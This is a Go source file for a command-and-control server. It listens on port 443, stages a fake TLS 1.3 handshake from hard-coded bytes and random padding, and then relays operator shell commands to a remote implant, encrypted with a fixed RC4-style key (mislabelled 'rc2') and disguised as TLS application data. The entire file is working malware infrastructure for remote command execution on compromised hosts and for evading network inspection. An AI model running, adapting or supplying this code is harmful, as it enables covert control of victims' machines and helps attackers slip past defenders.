package main

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strings"
)

const (
	SERVER_PORT = "443"
	SERVER_TYPE = "tcp"
)

func main() {
	fmt.Println("[+] Starting C2 server")
	server, err := net.Listen(SERVER_TYPE, ":"+SERVER_PORT)
	if err != nil {
		fmt.Println("[-] Error listening: ", err.Error())
		os.Exit(1)
	}
	defer server.Close()
	fmt.Printf("[+] Listening on %s\n", outbound_ip().String()+":"+SERVER_PORT)

	connection, err := server.Accept()
	if err != nil {
		fmt.Println("[-] Error accepting: ", err.Error())
		os.Exit(1)
	}
	fmt.Printf("[+] Connected to client (%s)\n", connection.RemoteAddr())

	serverHello(connection)
	processClient(connection)
}

func serverHello(connection net.Conn) {
	buffer := make([]byte, 5000)
	mLen, err := connection.Read(buffer)
	if err != nil {
		fmt.Println("Error reading:", err.Error())
	}

	if bytes.Compare(buffer[0:3], []byte{0x16, 0x03, 0x01}) != 0 {
		fmt.Println("[-] Invalid 'Client Hello'")
		return
	}

	fmt.Println("[+] Received 'Client Hello'")
	fmt.Printf("%s", hex.Dump([]byte(buffer[:mLen])))

	fmt.Println("[+] Sending 'Server Hello', 'Server Change Cipher Spec', 'Server Encrypted Extensions',\n",
		"           'Server Certificate', 'Server Certificate Verify', 'Server Handshake Finished'")
	aa := []byte{0x16, 0x03, 0x03, 0x00, 0x7a, 0x02, 0x00, 0x00, 0x76, 0x03, 0x03}
	ab := make([]byte, 0x20)
	rand.Read(ab)
	ac := []byte{0x20}
	ad := make([]byte, 0x20)
	rand.Read(ad)
	ae := []byte{0x13, 0x02, 0x00, 0x00, 0x2e, 0x00, 0x2b, 0x00, 0x02, 0x03, 0x04, 0x00, 0x33, 0x00, 0x24, 0x00, 0x1d, 0x00, 0x20}
	af := make([]byte, 0x20)
	rand.Read(af)
	ag := append(append(append(append(append(aa, ab...), ac...), ad...), ae...), af...)
	connection.Write(ag)

	_, err = connection.Write([]byte{0x14, 0x03, 0x03, 0x00, 0x01, 0x01})

	ba := []byte{0x17, 0x03, 0x03, 0x00, 0x17}
	bb := make([]byte, 0x17)
	rand.Read(bb)
	bc := append(ba, bb...)
	connection.Write(bc)

	ca := []byte{0x17, 0x03, 0x03, 0x03, 0x43}
	cb := make([]byte, 0x0343)
	rand.Read(cb)
	cc := append(ca, cb...)
	connection.Write(cc)

	da := []byte{0x17, 0x03, 0x03, 0x01, 0x19}
	db := make([]byte, 0x0119)
	rand.Read(db)
	dc := append(da, db...)
	connection.Write(dc)

	ea := []byte{0x17, 0x03, 0x03, 0x00, 0x45}
	eb := make([]byte, 0x45)
	rand.Read(eb)
	ec := append(ea, eb...)
	connection.Write(ec)

	mLen2, err2 := connection.Read(buffer)
	if err2 != nil {
		fmt.Println("Error reading:", err2.Error())
	}

	if bytes.Compare(buffer[0:3], []byte{0x14, 0x03, 0x03}) != 0 {
		fmt.Println("[-] Invalid 'Client Change Cipher Spec'")
		return
	}

	fmt.Println("[+] Received 'Client Change Cipher Spec', 'Client Handshake Finished'")
	fmt.Printf("%s", hex.Dump([]byte(buffer[:mLen2])))
}

func processClient(connection net.Conn) {
	key := []byte{0x79, 0xE1, 0x0A, 0x5D, 0x87, 0x7D, 0x9F, 0xF7, 0x5D, 0x12, 0x2E, 0x11, 0x65, 0xAC, 0xE3, 0x25}
	fmt.Println()

	for {
		consoleReader := bufio.NewReader(os.Stdin)
		fmt.Print("$ ")
		cmd, _ := consoleReader.ReadString('\n')
		cmd = strings.TrimRight(cmd, "\n")

		if len(cmd) > 3 && cmd[0:4] == "exit" {
			fmt.Println("\n[+] Closing connection")
			connection.Close()
			break
		}

		cmd_h := []byte{0x17, 0x03, 0x03}
		cmd_s := make([]byte, 2)
		binary.BigEndian.PutUint16(cmd_s, uint16(len(cmd)))
		cmd_p1 := append(cmd_h, cmd_s...)
		cmd_enc := make([]byte, 5000)
		rc2(key, []byte(cmd), cmd_enc, len(cmd))
		cmd_p2 := append(cmd_p1, []byte(cmd_enc)...)
		connection.Write(cmd_p2[:5+len(cmd)])

		ciphertext := make([]byte, 5000)
		mLen, err := connection.Read(ciphertext)
		if err != nil {
			fmt.Println("\n[-] Client disconnected")
			os.Exit(1)
		}
		if bytes.Compare(ciphertext[0:3], []byte{0x17, 0x03, 0x03}) != 0 {
			fmt.Println("\n[-] Invalid 'Client Application Data'\n")
			continue
		}

		plaintext := make([]byte, 5000)
		rc2(key, ciphertext[5:], plaintext, mLen-5)

		fmt.Println(string(plaintext))
	}
}

func rc2(key []byte, plaintext []byte, ciphertext []byte, mLen int) {
	s := make([]byte, 256)
	ksa(key, s)
	prga(s, plaintext, ciphertext, mLen)
}

func ksa(key []byte, s []byte) {
	key_len := len(key)
	j := 0

	for i := 0; i < 256; i++ {
		s[i] = byte(i)
	}

	for i := 0; i < 256; i++ {
		j = (j + int(s[i]) + int(key[i%key_len])) % 256

		s[i], s[j] = s[j], s[i]
	}
}

func prga(s []byte, plaintext []byte, ciphertext []byte, mLen int) {
	i := 0
	j := 0

	for n := 0; n < mLen; n++ {
		i = (i + 1) % 256
		j = (j + int(s[i])) % 256

		s[i], s[j] = s[j], s[i]
		rnd := s[int(s[i]+s[j])%256]

		ciphertext[n] = rnd ^ plaintext[n]
	}
}

func outbound_ip() net.IP {
	conn, _ := net.Dial("udp", "8.8.8.8:80")
	defer conn.Close()

	localAddr := conn.LocalAddr().(*net.UDPAddr)

	return localAddr.IP
}
